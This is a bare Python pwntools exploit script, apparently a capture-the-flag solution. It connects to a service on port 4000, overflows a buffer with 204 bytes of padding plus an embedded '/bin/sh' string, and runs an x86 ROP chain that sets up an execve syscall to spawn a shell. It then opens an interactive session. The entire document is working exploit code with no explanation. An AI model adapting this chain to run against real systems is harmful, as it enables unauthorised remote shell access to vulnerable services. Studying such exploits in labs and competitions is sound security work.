from pwn import *

r = remote('0.0.0.0', 4000)

binsh1 = 0x6e69622f	# /bin
binsh2 = 0x68732f	# /sh

padding = 'a' * 204 + p32(binsh1) + p32(binsh2)

#gadgets
pop_a = 0x080b8fc6	#pop eax ; ret
pop_dcb = 0x0806fa10	#pop edx ; pop ecx ; pop ebx ; ret
syscal = 0x0806d5c5	#int 0x80

payload = padding + p32(pop_a) + p32(0xb) + p32(pop_dcb) + p32(0) + p32(0) + p32(0xf6fff354) + p32(syscal)

r.sendline(payload)

r.interactive()

r.close()
